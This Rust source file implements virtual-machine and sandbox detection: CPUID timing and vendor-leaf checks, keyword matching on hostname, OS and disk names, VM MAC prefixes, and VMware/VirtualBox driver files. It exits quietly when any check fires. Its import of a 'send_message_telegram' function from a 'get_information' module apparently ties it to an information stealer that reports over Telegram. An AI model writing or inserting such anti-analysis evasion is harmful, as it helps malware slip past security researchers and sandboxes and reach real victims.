use std::arch::x86_64::{CpuidResult, __cpuid, _rdtsc};

// Credits : github.com/PicoJr/inside-vm
fn cpuid_cycle_count_avg(low: usize, samples: usize, high: usize) -> u64 {
    let mut tsc1: u64;
    let mut tsc2: u64;
    let mut cycles: Vec<u64> = vec![];
    let mut cpuid = CpuidResult {
        eax: 0,
        ebx: 0,
        ecx: 0,
        edx: 0,
    };
    for _ in 0..(low + samples + high) {
        unsafe {
            tsc1 = _rdtsc();
            cpuid = __cpuid(0);
            tsc2 = _rdtsc();
        }
        cycles.push(tsc2 - tsc1);
    }
    unsafe {
        // call to __cpuid would be optimized away by the compiler in release mode
        // if it were not for this call
        std::ptr::read_volatile(&cpuid);
    }

    // remove low and high outliers, keep samples
    cycles.sort_unstable();
    let cycles_without_outliers = &cycles[low..low + samples];

    // compute average cycle count without outliers, make sure we do not divide by zero
    let avg = cycles_without_outliers.iter().sum::<u64>() / std::cmp::max(samples as u64, 1);
    avg
}

fn cpuid() -> bool {
    unsafe {
        let cpuid = __cpuid(0x40000000);
        if cpuid.ecx == 0x4D566572 && cpuid.edx == 0x65726177 {
            true
        } else {
            false
        }
    }
}

fn check_invalid_leaf() -> bool {
    let invalid_leaf = 0xFFFFFFFF; // An invalid CPUID leaf

    let result: u32;
    unsafe {
        std::arch::asm!(
            "cpuid",
            inout("eax") invalid_leaf => result,
            lateout("ecx") _,
            lateout("edx") _,
        );
    }

    // Check if the result is still equal to the invalid_leaf
    result == invalid_leaf
}

pub fn inside_vm() -> bool {
    cpuid_cycle_count_avg(5, 100, 5) > 1_000 || cpuid() || check_invalid_leaf()
}

use mac_address::get_mac_address;
use std::fs;
use std::process::exit;
use sysinfo::{DiskExt, System, SystemExt};

use crate::get_information::send_message_telegram;

fn detect_vm_keywords() -> bool {
    let sys = System::new_all();

    let suspicious_keywords = vec![
        "vmware",
        "virtual",
        "vbox",
        "qemu",
        "hyper-v",
        "xen",
        "parallels",
        "kvm",
    ];

    let host_name = sys.host_name().unwrap_or_default().to_lowercase();
    let os_version = sys.long_os_version().unwrap_or_default().to_lowercase();
    let disks = sys.disks();

    for keyword in suspicious_keywords.iter() {
        if host_name.contains(keyword) || os_version.contains(keyword) {
            return true;
        }
    }

    for disk in disks {
        let name = disk.name().to_string_lossy().to_lowercase();
        if suspicious_keywords.iter().any(|k| name.contains(k)) {
            return true;
        }
    }

    false
}

fn detect_vm_mac() -> bool {
    if let Ok(Some(mac)) = get_mac_address() {
        let mac_str = mac.to_string().to_lowercase();
        let known_vm_macs = vec![
            "00:05:69", "00:0c:29", "00:1c:14", "00:50:56", // VMware
            "08:00:27", // VirtualBox
            "00:15:5d", // Hyper-V
        ];

        for prefix in known_vm_macs {
            if mac_str.starts_with(prefix) {
                return true;
            }
        }
    }

    false
}

fn detect_vm_files() -> bool {
    let paths = vec![
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        // apenas para windows pelo que vi kkk "/sys/class/dmi/id/product_name",
    ];

    for path in paths {
        if fs::metadata(path).is_ok() {
            return true;
        }
    }

    false
}

pub fn is_vm_or_no() {
    if detect_vm_keywords() || detect_vm_mac() || detect_vm_files() || inside_vm() {
        exit(0);
    }
}
